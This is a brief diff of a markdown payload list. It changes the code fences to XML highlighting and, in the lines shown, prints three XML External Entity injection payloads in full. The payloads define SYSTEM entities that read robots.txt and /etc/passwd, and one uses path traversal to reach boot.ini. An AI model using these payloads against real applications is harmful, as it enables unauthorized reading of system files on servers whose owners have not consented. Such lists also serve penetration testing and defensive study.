@@ -18,7 +18,7 @@
 
 - Payloads
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE change-log [
 <!ENTITY systemEntity SYSTEM "robots.txt">
@@ -28,7 +28,7 @@
 </change-log>
 ```
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE change-log [
 <!ENTITY systemEntity SYSTEM "/etc/passwd">
@@ -38,7 +38,7 @@
 </change-log>
 ```
 
-```
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE change-log [
 <!ENTITY systemEntity SYSTEM "../../../../boot.ini">
